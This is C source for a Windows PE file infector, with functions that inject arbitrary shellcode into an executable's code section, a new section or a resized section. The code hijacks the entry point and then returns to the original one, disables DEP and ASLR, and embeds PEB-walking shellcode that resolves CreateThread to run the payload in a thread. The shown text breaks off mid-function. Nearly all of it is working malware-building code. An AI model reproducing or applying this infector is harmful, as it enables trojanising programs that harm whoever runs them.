#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "PEinfector.h"
#include "PE.h"


#define DISABLE_DEP_ASLR nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_CAN_MOVE; \
	nt_header->nt_file_header.characteristics = nt_header->nt_file_header.characteristics | IMAGE_RELOCS_STRIPPED; \
	nt_header->nt_optional_header.data_directories.relocation_directory_rva = 0; \
	nt_header->nt_optional_header.data_directories.relocation_directory_size = 0; \
	nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_NX_COMPAT;




int pe_infect_section(pe_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, int thread_flag) {
	if (!nt_header || !sections || !xcode || *xcode == '\0') {
		return -1;
	}
	
	//search first code sections
	list_pe_section_t codeSect = sections;
	while (codeSect) {
		if (codeSect->header.Characteristics & SECTION_CHARACTER_EXECUTABLE) { //that section is code section
			break; 
		}
		codeSect = codeSect->next;
	}
	
	if (!codeSect) {
		//that file is not contain code section (is it possible?)
		return -2;
	}
	
	//search injection code offset
	uint32_t injection_xcode_offset = 0;
	
	//handle case when raw section size more than virtual section size
	if (codeSect->header.SizeOfRawData > codeSect->header.Misc.VirtualSize) {
		uint32_t delta = codeSect->header.SizeOfRawData - codeSect->header.Misc.VirtualSize;
		
		//checking delta
		if (delta >= nt_header->nt_optional_header.file_alignment) {
			//bad delta
			return -3;
		}
		
		//checking zeroes
		for (uint32_t i = 0; i < delta; i++) {
			if (codeSect->data[codeSect->header.Misc.VirtualSize + i] != '\0') {
				return -4;
			}
		}
		
		injection_xcode_offset = codeSect->header.Misc.VirtualSize;
	} else { //search inject offset
		uint32_t value = 0;
		
		for (uint32_t i = 0; i < codeSect->header.SizeOfRawData / sizeof(value); i++) {
			//fread(&value, sizeof(value), 1, f);
			memcpy(&value, codeSect->data + i * sizeof(value), sizeof(value));
			
			if (value == 0) {
				//inject offset found
				injection_xcode_offset = (i - 1) * sizeof(value) + 1;
				break;
			}
		}
	}
	
	injection_xcode_offset += 0x4;
	
	uint32_t original_entry_point = nt_header->nt_optional_header.address_of_entry_point + nt_header->nt_optional_header.image_base;
	char mov_eax_bytecode[] = "\xb8";
	char hex_original_entry_point[] = { (char)(original_entry_point) & 0xFF, (char)(original_entry_point >> 8) & 0xFF, (char)(original_entry_point >> 16) & 0xFF, (char)(original_entry_point >> 24) & 0xFF };
	char jmp_eax_nop_bytecode[] = "\xff\xe0\x90";
	
	if (codeSect->header.SizeOfRawData - injection_xcode_offset - 8 - thread_flag ? 0x99 : 0 < xcode_size) {
		//not enough space for xcode
		return -5;
	}
	
	//new entry point
	nt_header->nt_optional_header.address_of_entry_point = codeSect->header.VirtualAddress + injection_xcode_offset;
	
	uint32_t threadfunc_addr = nt_header->nt_optional_header.address_of_entry_point + 0x86 + nt_header->nt_optional_header.image_base;
	char peb_create_thread_mov_ecx[] = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda"
									"\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75"
									"\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01"
									"\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53\x52\x51\x68\x72"
									"\x65\x61\x64\x68\x74\x65\x54\x68\x68\x43\x72\x65\x61\x54\x53\xff\xd2\x31\xc9\x51\x51\x51\xb9";
	char peb_create_thread_hex_threadfunc[] = { (char)(threadfunc_addr) & 0xFF, (char)(threadfunc_addr >> 8) & 0xFF, (char)(threadfunc_addr >> 16) & 0xFF, (char)(threadfunc_addr >> 24) & 0xFF };
	char peb_create_thread_push_ecx_call_eax[] = "\x51\x31\xc9\x51\x51\xff\xd0";
	char threadfunc_prologue[] = "\x55\x89\xe5";
	
	fprintf(stdout, "original entry point 0x%08X\n", original_entry_point);
	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
	
	DISABLE_DEP_ASLR
	
	fprintf(stdout, "dll_characteristics 0x%04X\n", nt_header->nt_optional_header.dll_characteristics);
	
	//xcode injection
	if (thread_flag) {
		memcpy(codeSect->data + injection_xcode_offset, peb_create_thread_mov_ecx, sizeof(peb_create_thread_mov_ecx));
		memcpy(codeSect->data + injection_xcode_offset + sizeof(peb_create_thread_mov_ecx) - 1, peb_create_thread_hex_threadfunc, sizeof(peb_create_thread_hex_threadfunc));
		memcpy(codeSect->data + injection_xcode_offset + sizeof(peb_create_thread_mov_ecx) - 1 + sizeof(peb_create_thread_hex_threadfunc), peb_create_thread_push_ecx_call_eax, sizeof(peb_create_thread_push_ecx_call_eax));	
		injection_xcode_offset += sizeof(peb_create_thread_mov_ecx) - 1 + sizeof(peb_create_thread_hex_threadfunc) + sizeof(peb_create_thread_push_ecx_call_eax);
		//after create thread - goto original entry point
		memcpy(codeSect->data + injection_xcode_offset - 1, mov_eax_bytecode, sizeof(mov_eax_bytecode));
		memcpy(codeSect->data + injection_xcode_offset - 2 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
		memcpy(codeSect->data + injection_xcode_offset - 2 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
		memcpy(codeSect->data + injection_xcode_offset - 3 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point) + sizeof(jmp_eax_nop_bytecode), threadfunc_prologue, sizeof(threadfunc_prologue));
		memcpy(codeSect->data + injection_xcode_offset - 4 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point) + sizeof(jmp_eax_nop_bytecode) + sizeof(threadfunc_prologue), xcode, xcode_size);
	} else {
		memcpy(codeSect->data + injection_xcode_offset, xcode, xcode_size);
		memcpy(codeSect->data + injection_xcode_offset + xcode_size, mov_eax_bytecode, sizeof(mov_eax_bytecode));
		memcpy(codeSect->data + injection_xcode_offset + xcode_size - 1 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
		memcpy(codeSect->data + injection_xcode_offset + xcode_size  - 1 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
	}
	
	return 0;
}

int pe64_infect_section(pe64_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size) {
	if (!nt_header || !sections || !xcode || *xcode == '\0') {
		return -1;
	}
	
	//search first code sections
	list_pe_section_t codeSect = sections;
	while (codeSect) {
		if (codeSect->header.Characteristics & SECTION_CHARACTER_EXECUTABLE) { //that section is code section
			break; 
		}
		codeSect = codeSect->next;
	}
	
	if (!codeSect) {
		//that file is not contain code section (is it possible?)
		return -2;
	}
	
	//search injection code offset
	uint32_t injection_xcode_offset = 0;
	
	//handle case when raw section size more than virtual section size
	if (codeSect->header.SizeOfRawData > codeSect->header.Misc.VirtualSize) {
		uint32_t delta = codeSect->header.SizeOfRawData - codeSect->header.Misc.VirtualSize;
		
		//checking delta
		if (delta >= nt_header->nt_optional_header.file_alignment) {
			//bad delta
			return -3;
		}
		
		//checking zeroes
		for (uint32_t i = 0; i < delta; i++) {
			if (codeSect->data[codeSect->header.Misc.VirtualSize + i] != '\0') {
				return -4;
			}
		}
		
		injection_xcode_offset = codeSect->header.Misc.VirtualSize;
	} else { //search inject offset
		uint32_t value = 0;
		
		for (uint32_t i = 0; i < codeSect->header.SizeOfRawData / sizeof(value); i++) {
			//fread(&value, sizeof(value), 1, f);
			memcpy(&value, codeSect->data + i * sizeof(value), sizeof(value));
			
			if (value == 0) {
				//inject offset found
				injection_xcode_offset = (i - 1) * sizeof(value) + 1;
				break;
			}
		}
	}
	
	injection_xcode_offset += 0x8;
	uint64_t original_entry_point = nt_header->nt_optional_header.address_of_entry_point + nt_header->nt_optional_header.image_base;
	char mov_rax_bytecode[] = "\x48\xb8";
	char hex_original_entry_point[] = { (char)(original_entry_point) & 0xFF, (char)(original_entry_point >> 8) & 0xFF, (char)(original_entry_point >> 16) & 0xFF, (char)(original_entry_point >> 24) & 0xFF,
										(char)(original_entry_point >> 32) & 0xFF, (char)(original_entry_point >> 40) & 0xFF, (char)(original_entry_point >> 48) & 0xFF, (char)(original_entry_point >> 56) & 0xFF };
	char jmp_rax_nop_bytecode[] = "\xff\xe0\x90\x90\x90\x90";
	
	if (codeSect->header.SizeOfRawData - injection_xcode_offset - 16 < xcode_size) {
		//not enough space for xcode
		return -5;
	}
	
	//new entry point
	nt_header->nt_optional_header.address_of_entry_point = codeSect->header.VirtualAddress + injection_xcode_offset;
	
	fprintf(stdout, "original entry point 0x%016lX\n", original_entry_point);
	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
	
	DISABLE_DEP_ASLR
	
	fprintf(stdout, "dll_characteristics 0x%04X\n", nt_header->nt_optional_header.dll_characteristics);
	
	//xcode injection
	memcpy(codeSect->data + injection_xcode_offset, xcode, xcode_size);
	memcpy(codeSect->data + injection_xcode_offset + xcode_size, mov_rax_bytecode, sizeof(mov_rax_bytecode));
	memcpy(codeSect->data + injection_xcode_offset + xcode_size - 1 + sizeof(mov_rax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
	memcpy(codeSect->data + injection_xcode_offset + xcode_size  - 1 + sizeof(mov_rax_bytecode) + sizeof(hex_original_entry_point), jmp_rax_nop_bytecode, sizeof(jmp_rax_nop_bytecode));
	
	return 0;
}

int pe_infect_new_section(pe_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, const char* new_section_name, int thread_flag) {
	if (!nt_header || !sections || !xcode || *xcode == '\0' || !new_section_name || *new_section_name == '\0') {
		return -1;
	}
	
	//search first code sections
	uint32_t higher_raw_offset = 0;
	uint32_t higher_raw_size = 0;
	uint32_t higher_virtual_offset = 0;
	uint32_t higher_virtual_size = 0;
	
	list_pe_section_t curSect = sections;
	list_pe_section_t codeSect = NULL;
	list_pe_section_t lastSect = NULL;
	list_pe_section_t newSect = NULL;
	
	while (curSect) {
		if ((curSect->header.Characteristics & SECTION_CHARACTER_EXECUTABLE) && (!codeSect)) { //that section is code section
			codeSect = curSect;
		}
		
		if (curSect->header.PointerToRawData > higher_raw_offset) {
			lastSect = curSect;
			higher_raw_offset = lastSect->header.PointerToRawData;
			higher_raw_size = lastSect->header.SizeOfRawData;
		}
		
		if (curSect->header.VirtualAddress >higher_virtual_offset) {
			higher_virtual_offset = curSect->header.VirtualAddress;
			higher_virtual_size = curSect->header.Misc.VirtualSize;
		}
		
		curSect = curSect->next;
	}
	
	if (!codeSect) {
		//that file is not contain code section (is it possible?)
		return -2;
	}
	
	newSect = (list_pe_section_t)malloc(sizeof(list_pe_section));
	if (!newSect) {
		//internal error: can't allocate memory for new section
		return -3;
	}
	
	//fill header
	memset(&newSect->header, 0, sizeof(pe_section_header));
	strncpy(newSect->header.name, new_section_name, SECTION_SHORT_NAME_LENGTH);
	newSect->header.Misc.VirtualSize = thread_flag ? P2ALIGNUP(xcode_size + 0x8 + 0x99, nt_header->nt_optional_header.section_alignment)
								:	P2ALIGNUP(xcode_size + 0x8, nt_header->nt_optional_header.section_alignment);
	newSect->header.VirtualAddress = P2ALIGNUP(higher_virtual_offset + higher_virtual_size, nt_header->nt_optional_header.section_alignment);
	newSect->header.SizeOfRawData = thread_flag ? P2ALIGNUP(xcode_size + 0x8 + 0x99, nt_header->nt_optional_header.file_alignment)
								:	P2ALIGNUP(xcode_size + 0x8, nt_header->nt_optional_header.file_alignment);
	newSect->header.PointerToRawData = higher_raw_offset + higher_raw_size;
	newSect->header.Characteristics = SECTION_CHARACTER_MEM_EXECUTE | SECTION_CHARACTER_MEM_READ | SECTION_CHARACTER_EXECUTABLE;
	//fill section data
	newSect->data = (char*)malloc(newSect->header.SizeOfRawData);
	if (!newSect->data) {
		//internal error: can't allocate memory for new section data
		free(newSect);
		return -4;
	}
	newSect->next = NULL;
	lastSect->next = newSect;
	nt_header->nt_file_header.number_of_sections++;
	
	//new size of image
	nt_header->nt_optional_header.size_of_image = P2ALIGNUP(newSect->header.VirtualAddress + newSect->header.Misc.VirtualSize, nt_header->nt_optional_header.section_alignment);
	
	//write xcode
	uint32_t original_entry_point = nt_header->nt_optional_header.address_of_entry_point + nt_header->nt_optional_header.image_base;
	char mov_eax_bytecode[] = "\xb8";
	char hex_original_entry_point[] = { (char)(original_entry_point) & 0xFF, (char)(original_entry_point >> 8) & 0xFF, (char)(original_entry_point >> 16) & 0xFF, (char)(original_entry_point >> 24) & 0xFF };
	char jmp_eax_nop_bytecode[] = "\xff\xe0\x90";
	
	//for thread prologue
	uint32_t threadfunc_addr = nt_header->nt_optional_header.image_base + 0x86 + newSect->header.VirtualAddress;
	char peb_create_thread_mov_ecx[] = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda"
									"\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75"
									"\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01"
									"\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53\x52\x51\x68\x72"
									"\x65\x61\x64\x68\x74\x65\x54\x68\x68\x43\x72\x65\x61\x54\x53\xff\xd2\x31\xc9\x51\x51\x51\xb9";
									
	char peb_create_thread_hex_threadfunc[] = { (char)(threadfunc_addr) & 0xFF, (char)(threadfunc_addr >> 8) & 0xFF, (char)(threadfunc_addr >> 16) & 0xFF, (char)(threadfunc_addr >> 24) & 0xFF };
	char peb_create_thread_push_ecx_call_eax[] = "\x51\x31\xc9\x51\x51\xff\xd0";
	char threadfunc_prologue[] = "\x55\x89\xe5";
	
	if (thread_flag) {
		memcpy(newSect->data, peb_create_thread_mov_ecx, sizeof(peb_create_thread_mov_ecx));
		memcpy(newSect->data + sizeof(peb_create_thread_mov_ecx) - 1, peb_create_thread_hex_threadfunc, sizeof(peb_create_thread_hex_threadfunc));
		memcpy(newSect->data + sizeof(peb_create_thread_mov_ecx) - 1 + sizeof(peb_create_thread_hex_threadfunc), peb_create_thread_push_ecx_call_eax, sizeof(peb_create_thread_push_ecx_call_eax));	
		//injection_xcode_offset += sizeof(peb_create_thread_mov_ecx) - 1 + sizeof(peb_create_thread_hex_threadfunc) + sizeof(peb_create_thread_push_ecx_call_eax);
		uint32_t offset = sizeof(peb_create_thread_mov_ecx) - 1 + sizeof(peb_create_thread_hex_threadfunc) + sizeof(peb_create_thread_push_ecx_call_eax);
		//after create thread - goto original entry point
		memcpy(newSect->data + offset - 1, mov_eax_bytecode, sizeof(mov_eax_bytecode));
		memcpy(newSect->data + offset - 2 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
		memcpy(newSect->data + offset - 2 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
		memcpy(newSect->data + offset - 3 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point) + sizeof(jmp_eax_nop_bytecode), threadfunc_prologue, sizeof(threadfunc_prologue));
		memcpy(newSect->data + offset - 4 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point) + sizeof(jmp_eax_nop_bytecode) + sizeof(threadfunc_prologue), xcode, xcode_size);
	} else {
		memcpy(newSect->data, xcode, xcode_size);
		memcpy(newSect->data + xcode_size, mov_eax_bytecode, sizeof(mov_eax_bytecode));
		memcpy(newSect->data + xcode_size - 1 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
		memcpy(newSect->data + xcode_size  - 1 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
	}
	
	//write jmp prologue in code section
	uint32_t injection_offset = 0;
	
	//handle case when raw section size more than virtual section size
	if (codeSect->header.SizeOfRawData > codeSect->header.Misc.VirtualSize) {
		uint32_t delta = codeSect->header.SizeOfRawData - codeSect->header.Misc.VirtualSize;
		
		//checking delta
		if (delta >= nt_header->nt_optional_header.file_alignment) {
			//bad delta
			return -5;
		}
		
		//checking zeroes
		for (uint32_t i = 0; i < delta; i++) {
			if (codeSect->data[codeSect->header.Misc.VirtualSize + i] != '\0') {
				return -6;
			}
		}
		
		injection_offset = codeSect->header.Misc.VirtualSize;
	} else { //search inject offset
		uint32_t value = 0;
		
		for (uint32_t i = 0; i < codeSect->header.SizeOfRawData / sizeof(value); i++) {
			memcpy(&value, codeSect->data + i * sizeof(value), sizeof(value));
			
			if (value == 0) {
				//inject offset found
				injection_offset = (i - 1) * sizeof(value) + 1;
				break;
			}
		}
	}
	
	injection_offset += 0x4;
	
	//jmp to new section
	uint32_t second_entry_point = nt_header->nt_optional_header.image_base + newSect->header.VirtualAddress;
	char hex_second_entry_point[] = { (char)(second_entry_point) & 0xFF, (char)(second_entry_point >> 8) & 0xFF, (char)(second_entry_point >> 16) & 0xFF, (char)(second_entry_point >> 24) & 0xFF };
	
	memcpy(codeSect->data + injection_offset, mov_eax_bytecode, sizeof(mov_eax_bytecode));
	memcpy(codeSect->data + injection_offset + sizeof(mov_eax_bytecode) - 1, hex_second_entry_point, sizeof(hex_second_entry_point));
	memcpy(codeSect->data + injection_offset + sizeof(mov_eax_bytecode) - 1 + sizeof(hex_second_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
	
	//new entry point
	nt_header->nt_optional_header.address_of_entry_point = codeSect->header.VirtualAddress + injection_offset;
	
	fprintf(stdout, "original entry point 0x%08X\n", original_entry_point);
	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
	
	DISABLE_DEP_ASLR
	
	return 0;
}

int pe64_infect_new_section(pe64_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, const char* new_section_name) {
	if (!nt_header || !sections || !xcode || *xcode == '\0' || !new_section_name || *new_section_name == '\0') {
		return -1;
	}
	
	//search first code sections
	uint32_t higher_raw_offset = 0;
	uint32_t higher_raw_size = 0;
	uint32_t higher_virtual_offset = 0;
	uint32_t higher_virtual_size = 0;
	
	list_pe_section_t curSect = sections;
	list_pe_section_t codeSect = NULL;
	list_pe_section_t lastSect = NULL;
	list_pe_section_t newSect = NULL;
	
	while (curSect) {
		if ((curSect->header.Characteristics & SECTION_CHARACTER_EXECUTABLE) && (!codeSect)) { //that section is code section
			codeSect = curSect;
		}
		
		if (curSect->header.PointerToRawData > higher_raw_offset) {
			lastSect = curSect;
			higher_raw_offset = lastSect->header.PointerToRawData;
			higher_raw_size = lastSect->header.SizeOfRawData;
		}
		
		if (curSect->header.VirtualAddress >higher_virtual_offset) {
			higher_virtual_offset = curSect->header.VirtualAddress;
			higher_virtual_size = curSect->header.Misc.VirtualSize;
		}
		
		curSect = curSect->next;
	}
	
	if (!codeSect) {
		//that file is not contain code section (is it possible?)
		return -2;
	}
	
	newSect = (list_pe_section_t)malloc(sizeof(list_pe_section));
	if (!newSect) {
		//internal error: can't allocate memory for new section
		return -3;
	}
	
	//fill header
	memset(&newSect->header, 0, sizeof(pe_section_header));
	strncpy(newSect->header.name, new_section_name, SECTION_SHORT_NAME_LENGTH);
	newSect->header.Misc.VirtualSize = P2ALIGNUP(xcode_size + 0x10, nt_header->nt_optional_header.section_alignment);
	newSect->header.VirtualAddress = P2ALIGNUP(higher_virtual_offset + higher_virtual_size, nt_header->nt_optional_header.section_alignment);
	newSect->header.SizeOfRawData = P2ALIGNUP(xcode_size + 0x10, nt_header->nt_optional_header.file_alignment);
	newSect->header.PointerToRawData = higher_raw_offset + higher_raw_size;
	newSect->header.Characteristics = SECTION_CHARACTER_MEM_EXECUTE | SECTION_CHARACTER_MEM_READ | SECTION_CHARACTER_EXECUTABLE;
	//fill section data
	newSect->data = (char*)malloc(newSect->header.SizeOfRawData);
	if (!newSect->data) {
		//internal error: can't allocate memory for new section data
		free(newSect);
		return -4;
	}
	newSect->next = NULL;
	lastSect->next = newSect;
	nt_header->nt_file_header.number_of_sections++;
	
	//new size of image
	nt_header->nt_optional_header.size_of_image = P2ALIGNUP(newSect->header.VirtualAddress + newSect->header.Misc.VirtualSize, nt_header->nt_optional_header.section_alignment);
	
	//write xcode
	uint64_t original_entry_point = nt_header->nt_optional_header.address_of_entry_point + nt_header->nt_optional_header.image_base;
	char mov_rax_bytecode[] = "\x48\xb8";
	char hex_original_entry_point[] = { (char)(original_entry_point) & 0xFF, (char)(original_entry_point >> 8) & 0xFF, (char)(original_entry_point >> 16) & 0xFF, (char)(original_entry_point >> 24) & 0xFF,
										(char)(original_entry_point >> 32) & 0xFF, (char)(original_entry_point >> 40) & 0xFF, (char)(original_entry_point >> 48) & 0xFF, (char)(original_entry_point >> 56) & 0xFF };
	char jmp_rax_nop_bytecode[] = "\xff\xe0\x90\x90\x90\x90";
	
	memcpy(newSect->data, xcode, xcode_size);
	memcpy(newSect->data + xcode_size, mov_rax_bytecode, sizeof(mov_rax_bytecode));
	memcpy(newSect->data + xcode_size - 1 + sizeof(mov_rax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
	memcpy(newSect->data + xcode_size  - 1 + sizeof(mov_rax_bytecode) + sizeof(hex_original_entry_point), jmp_rax_nop_bytecode, sizeof(jmp_rax_nop_bytecode));
	
	//write jmp prologue in code section
	uint32_t injection_offset = 0;
	
	//handle case when raw section size more than virtual section size
	if (codeSect->header.SizeOfRawData > codeSect->header.Misc.VirtualSize) {
		uint32_t delta = codeSect->header.SizeOfRawData - codeSect->header.Misc.VirtualSize;
		
		//checking delta
		if (delta >= nt_header->nt_optional_header.file_alignment) {
			//bad delta
			return -5;
		}
		
		//checking zeroes
		for (uint32_t i = 0; i < delta; i++) {
			if (codeSect->data[codeSect->header.Misc.VirtualSize + i] != '\0') {
				return -6;
			}
		}
		
		injection_offset = codeSect->header.Misc.VirtualSize;
	} else { //search inject offset
		uint64_t value = 0;
		
		for (uint32_t i = 0; i < codeSect->header.SizeOfRawData / sizeof(value); i++) {
			memcpy(&value, codeSect->data + i * sizeof(value), sizeof(value));
			
			if (value == 0) {
				//inject offset found
				injection_offset = (i - 1) * sizeof(value) + 1;
				break;
			}
		}
	}
	
	injection_offset += 0x8;
	
	//jmp to new section
	uint64_t second_entry_point = nt_header->nt_optional_header.image_base + newSect->header.VirtualAddress;
	char hex_second_entry_point[] = { (char)(second_entry_point) & 0xFF, (char)(second_entry_point >> 8) & 0xFF, (char)(second_entry_point >> 16) & 0xFF, (char)(second_entry_point >> 24) & 0xFF,
										(char)(second_entry_point >> 32) & 0xFF, (char)(second_entry_point >> 40) & 0xFF, (char)(second_entry_point >> 48) & 0xFF, (char)(second_entry_point >> 56) & 0xFF };
	
	memcpy(codeSect->data + injection_offset, mov_rax_bytecode, sizeof(mov_rax_bytecode));
	memcpy(codeSect->data + injection_offset + sizeof(mov_rax_bytecode) - 1, hex_second_entry_point, sizeof(hex_second_entry_point));
	memcpy(codeSect->data + injection_offset + sizeof(mov_rax_bytecode) - 1 + sizeof(hex_second_entry_point), jmp_rax_nop_bytecode, sizeof(jmp_rax_nop_bytecode));
	
	//new entry point
	nt_header->nt_optional_header.address_of_entry_point = codeSect->header.VirtualAddress + injection_offset;
	
	fprintf(stdout, "original entry point 0x%16lX\n", original_entry_point);
	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
	
	DISABLE_DEP_ASLR
	
	return 0;
}

int pe_infect_resize_section(pe_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, int thread_flag) {
	if (!nt_header || !sections || !xcode || *xcode == '\0') {
		return -1;
	}
	
	//search first code sections and nearest section in virtual space
	list_pe_section_t codeSect = NULL;
	list_pe_section_t nearSect = NULL;
	list_pe_section_t curSect = sections;
	
	while (curSect) {
		if ((curSect->header.Characteristics & SECTION_CHARACTER_EXECUTABLE) && !codeSect) { //that section is code section
			codeSect = curSect;
			curSect = sections;
			continue;
		}
		
		if (codeSect && curSect != codeSect) {
			uint32_t edge = P2ALIGNUP(codeSect->header.Misc.VirtualSize + codeSect->header.VirtualAddress, nt_header->nt_optional_header.section_alignment);
			
			if (!nearSect) {
				nearSect = curSect;
			} else {
				if ((curSect->header.VirtualAddress - edge) < (nearSect->header.VirtualAddress - edge)) {
					nearSect = curSect;
				}
			}
		}
		
		curSect = curSect->next;
	}
	
	if (!codeSect) {
		//that file is not contain code section (is it possible?)
		return -2;
	}
	
	//resize code sect
	uint32_t newVirtualSize = thread_flag ? P2ALIGNUP(codeSect->header.Misc.VirtualSize + xcode_size + 0x8 + 0x99, nt_header->nt_optional_header.section_alignment)
							:	P2ALIGNUP(codeSect->header.Misc.VirtualSize + xcode_size + 0x8, nt_header->nt_optional_header.section_alignment);
	uint32_t newRawSize = thread_flag ? P2ALIGNUP(codeSect->header.Misc.VirtualSize + xcode_size + 0x8 + 0x99, nt_header->nt_optional_header.section_alignment)
						:	P2ALIGNUP(codeSect->header.SizeOfRawData + xcode_size + 0x8, nt_header->nt_optional_header.file_alignment);
	
	if (nearSect && ((newVirtualSize + codeSect->header.VirtualAddress) > nearSect->header.VirtualAddress)) {
		//not possible for resizing section
		return -3;
	}
	
	fprintf(stdout, "newVirtualSize + codeSect->header.VirtualAddress: 0x%04X\n", newVirtualSize + codeSect->header.VirtualAddress);
	fprintf(stdout, "nearSect->header.VirtualAddress: 0x%04X\n", nearSect->header.VirtualAddress);
	
	uint32_t injection_xcode_offset = codeSect->header.SizeOfRawData;
	uint32_t diff_rawSize = newRawSize - codeSect->header.SizeOfRawData;
	codeSect->header.Misc.VirtualSize = newVirtualSize;
	codeSect->header.SizeOfRawData = newRawSize;
	codeSect->data = (char*)realloc(codeSect->data, codeSect->header.SizeOfRawData);
	
	if (!codeSect->data) {
		//cannot allocate memory for new data
		return -4;
	}
	
	//align another sections (if it need)
	curSect = sections;
	while (curSect) {
		if (curSect->header.PointerToRawData > codeSect->header.PointerToRawData) {
			curSect->header.PointerToRawData += diff_rawSize;
		}
		
		curSect = curSect->next;
	}
	
	//inject xcode
	uint32_t original_entry_point = nt_header->nt_optional_header.address_of_entry_point + nt_header->nt_optional_header.image_base;
	char mov_eax_bytecode[] = "\xb8";
	char hex_original_entry_point[] = { (char)(original_entry_point) & 0xFF, (char)(original_entry_point >> 8) & 0xFF, (char)(original_entry_point >> 16) & 0xFF, (char)(original_entry_point >> 24) & 0xFF };
	char jmp_eax_nop_bytecode[] = "\xff\xe0\x90";
	
	//new entry point
	nt_header->nt_optional_header.address_of_entry_point = codeSect->header.VirtualAddress + injection_xcode_offset;
	
	//for thread prologue
	uint32_t threadfunc_addr = nt_header->nt_optional_header.address_of_entry_point + 0x86 + nt_header->nt_optional_header.image_base;
	char peb_create_thread_mov_ecx[] = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda"
									"\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75"
									"\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01"
									"\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53\x52\x51\x68\x72"
									"\x65\x61\x64\x68\x74\x65\x54\x68\x68\x43\x72\x65\x61\x54\x53\xff\xd2\x31\xc9\x51\x51\x51\xb9";
	char peb_create_thread_hex_threadfunc[] = { (char)(threadfunc_addr) & 0xFF, (char)(threadfunc_addr >> 8) & 0xFF, (char)(threadfunc_addr >> 16) & 0xFF, (char)(threadfunc_addr >> 24) & 0xFF };
	char peb_create_thread_push_ecx_call_eax[] = "\x51\x31\xc9\x51\x51\xff\xd0";
	char threadfunc_prologue[] = "\x55\x89\xe5";
	
	fprintf(stdout, "original entry point 0x%08X\n", original_entry_point);
	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
	
	DISABLE_DEP_ASLR
	
	fprintf(stdout, "dll_characteristics 0x%04X\n", nt_header->nt_optional_header.dll_characteristics);
	
	//xcode injection
	if (thread_flag) {
		memcpy(codeSect->data + injection_xcode_offset, peb_create_thread_mov_ecx, sizeof(peb_create_thread_mov_ecx));
		memcpy(codeSect->data + injection_xcode_offset + sizeof(peb_create_thread_mov_ecx) - 1, peb_create_thread_hex_threadfunc, sizeof(peb_create_thread_hex_threadfunc));
		memcpy(codeSect->data + injection_xcode_offset + sizeof(peb_create_thread_mov_ecx) - 1 + sizeof(peb_create_thread_hex_threadfunc), peb_create_thread_push_ecx_call_eax, sizeof(peb_create_thread_push_ecx_call_eax));	
		injection_xcode_offset += sizeof(peb_create_thread_mov_ecx) - 1 + sizeof(peb_create_thread_hex_threadfunc) + sizeof(peb_create_thread_push_ecx_call_eax);
		//after create thread - goto original entry point
